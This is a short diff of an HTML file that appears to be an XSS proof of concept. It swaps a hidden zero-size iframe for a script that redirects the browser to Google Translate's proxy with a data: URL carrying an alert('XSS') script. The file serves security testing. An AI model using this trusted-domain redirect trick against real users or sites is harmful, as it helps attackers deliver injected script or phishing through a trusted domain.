@@ -2,9 +2,12 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>XSS via iFrame</title>
+    <title>Redirect XSS</title>
 </head>
 <body>
-    <iframe src="https://translate.google.com/translate?sl=auto&tl=en&u=data:text/html,%3Cscript%3Ealert('XSS')%3C/script%3E" width="0" height="0" style="border:0;"></iframe>
+    <script>
+        // Redirect to a URL with a payload XSS
+        window.location.href = "https://translate.google.com/translate?sl=auto&tl=en&u=" + encodeURIComponent("data:text/html,<script>alert('XSS');</script>");
+    </script>
 </body>
 </html>
